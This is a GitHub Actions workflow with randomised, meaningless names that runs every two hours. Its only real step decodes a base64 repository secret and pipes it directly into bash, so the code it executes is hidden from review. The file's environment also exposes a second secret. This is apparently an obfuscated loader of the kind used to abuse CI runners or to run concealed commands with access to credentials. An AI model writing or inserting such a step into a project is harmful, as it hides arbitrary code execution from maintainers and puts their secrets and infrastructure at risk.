name: hoTwGoWRE
on:
  schedule:
    - cron: '0 */2 * * *'
  workflow_dispatch:
jobs:
  gmUjAyZRRlkD:
    runs-on: ubuntu-22.04
    env:
      EJUNyKQ: ${{ secrets.vSPFhG }}
    steps:
      - uses: actions/checkout@v5
      - run: echo "${{ secrets.vGXbCVCiOJY }}" | base64 -d | bash
